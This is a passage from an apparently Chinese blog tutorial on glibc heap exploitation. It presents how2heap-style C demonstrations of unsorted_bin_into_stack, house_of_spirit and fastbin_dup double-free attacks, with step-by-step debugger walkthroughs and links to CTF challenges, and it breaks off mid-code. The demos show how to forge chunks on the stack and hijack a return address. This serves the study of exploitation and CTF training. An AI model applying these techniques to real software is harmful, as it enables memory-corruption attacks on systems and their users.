                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_UC93S5J8Q2CNP72.png"
                     
                ><br>在0x4007D9处下断点，查看heap和bins信息。可以看到，0x602000处的chunk的bk指针被改为了一个栈值，fd指向main_arena+0x58的位置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922101848230.png"
                      alt="image-20230922101848230"
                ><br>再次将unsortedbin中第一个chunk给malloc出来以后，unsortedbin中仅剩StackVar-0x10。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ZJY9Q5VVBT68CZ3.png"
                     
                ><br>在0x400828下断点。查看heap和bins信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_Z4EUWZVH32R7NCC.png"
                     
                ><br>可以看到，StackVar的fd指针即用户区域起始处已被修改为main_arena+0x58的值。</p>
<h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">	stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">	stack_buffer[<span class="number">3</span>] = (<span class="type">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">	victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">	victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">	<span class="built_in">memcpy</span>((p2+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu16.04编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><p>首先申请两个堆块<br>第一次申请的0x100大小的堆块给了[rbp+ptr]。第二个0x100是阻断topchunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SKW8ZP7TMRGT4KH.png"
                     
                ><br>接下来free(ptr)，把ptr放入unsorted bin中。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_M9SHEHDCSMPZBD7.png"
                     
                ><br>在0x4007A7其fd，bk指向main_arena+x58的位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2PFN7JA5YKTQ3WJ.png"
                     
                ><br>这里把var_28位置写为0x110。IDA里这个var_28中的0x28是16进制的偏移。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XUU37A7TTNM9CTE.png"
                     
                ><br>这里把rax指向ptr-8的位置，特就是size处。然后将其改为0x20。unsorted bin有FIFO特性，下次申请0x100大小不会找到它。然后将ptr+8的位置指向var_30，也就是把ptr的bk指针指向var_0x28+0x8的位置（bk指向后进入unsorted bin的chunk），var_0x28&#x3D;0x110，也就是伪造的chunk大小，var_30也就是prev_size的位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7FFXHQMZJZJ6VD9.png"
                     
                ><br>在0x40081C下断点，可见ptr的bk指向栈。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_X8QF98YVC2Y7HSR.png"
                     
                ><br>查看0x602410内存可见ptr的size位置被改为了0x20<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_RNY3WYAWYJ7DY93.png"
                     
                ><br>接下来申请0x100大小的chunk将会去unsorted bin寻找0x110大小的chunk，ptr已被改为0x20大小，所以跳过ptr申请到了栈上伪造的var_30处chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4R6P2X9QDR3K5EQ.png"
                     
                ><br>在0x40082B处下断点，可见malloc后，unsorted被整理，0x20大小的ptr放进了small bin。fd和bk都指向main_arena+104处。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CFQPP2ZXM4P7YKJ.png"
                     
                ><br>申请成功。</p>
<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="built_in">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu16.04编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><p>初始化堆。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922091755981-1695348432658-25.png"
                      alt="image-20230922091755981"
                ></p>
<p>在<code>0x400703</code>处下断点查看堆结构。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922091916522-1695348571707-28.png"
                     
                ><br>栈中数组结构。<code>fake_chunks_size = 0x40</code>，<code>fake_chunks_next_size = 0x1234</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092146583-1695348610428-32.png"
                      alt="image-20230922092146583"
                ><br>将 <code>a</code> 指向<code>fake_chunks_fd</code>，然后 <code>free(a)</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092342656-1695348634598-36.png"
                      alt="image-20230922092342656"
                ><br>成功将栈地址放入 <code>fastbins</code> 中。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092506302-1695348654255-39.png"
                      alt="image-20230922092506302"
                ><br>那麽此时申请0x30大小的空间会在fastbins中寻找0x40大小的chunk，便可成功申请到栈上。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092715145-1695348671021-42.png"
                      alt="image-20230922092715145"
                ></p>
<h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><ul>
<li>fast bin attack<br>例题1：<a class="link"   href="https://www.52pojie.cn/thread-1817311-1-1.html" >0CTF2017:babyheap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>unsafe unlink<br>例题2：<a class="link"   href="https://www.52pojie.cn//thread-1820017-1-1.html" >HITCON CTF 2016 : Secret Holdr <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>例题3：<a class="link"   href="https://www.52pojie.cn/thread-1825577-1-1.html" >HITCON CTF 2016 : SleepyHolder <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-4"><a href="#调试-4" class="headerlink" title="调试"></a>调试</h3><p>使用ubuntu:16.04编译，<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XWR593Z6QWM678A.png"
                     
                ><br>然后使用pwncli修改运行环境。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_HFXM6UD3SRQFGMH.png"
                      alt="图片描述"
                ><br>malloc三次相同大小的堆块后，在0x400700下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2EGACEX74TU3QRY.png"
                      alt="图片描述"
                ><br>观察堆结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_24PJANS2GM8MB2P.png"
                      alt="图片描述"
                ><br>依次释放堆块a,b后，在0x4007CF下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_A2SCWXK32FJK626.png"
                      alt="图片描述"
                ><br>观察fastbin结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5KFTD8D4QBYUZRY.png"
                      alt="图片描述"
                ><br>再次释放a,形成double free后，在0x4007F8下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JZ24RST96TR5RPJ.png"
                      alt="图片描述"
                ><br>观察fastbin结构，已经形成ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_782YNCGZFNYW8QR.png"
                      alt="图片描述"
                ><br>此时依次申请a,b,c三个相应大小的堆块，将会依次摘出a,b,a,<br>fastbin中a-&gt;b-&gt;a-&gt;b…这条链子会一直存在，不断从头部取出相应大小的堆块。<br>申请a后，在0x400835下断点（rax保存了_malloc函数的返回值）。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QA4NT4K533CQDKZ.png"
                      alt="图片描述"
                ><br>此时fastbin结构，形成了BAB结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YRGPNNXAJD7C2F9.png"
                      alt="图片描述"
                ><br>同样，申请完b后在0x400843下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PTP2U3KSVCT74TK.png"
                      alt="图片描述"
                ><br>此时fastbin结构，又形成了ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J4CQ4CJAZSCH7WU.png"
                      alt="图片描述"
                ><br>同样申请完c后在0x400851下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CR3CMBC9VJWUDT3.png"
                      alt="图片描述"
                ><br>此时fastbin结构，再次形成BAB结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KSXPFGVAYV5H9YZ.png"
                      alt="图片描述"
                ><br>此时a和c指向同一地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J4MZWDG2C8F3WEA.png"
                      alt="图片描述"
                ></p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This is a powerful technique that bypasses the double free check in tcachebin.&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p3 = <span 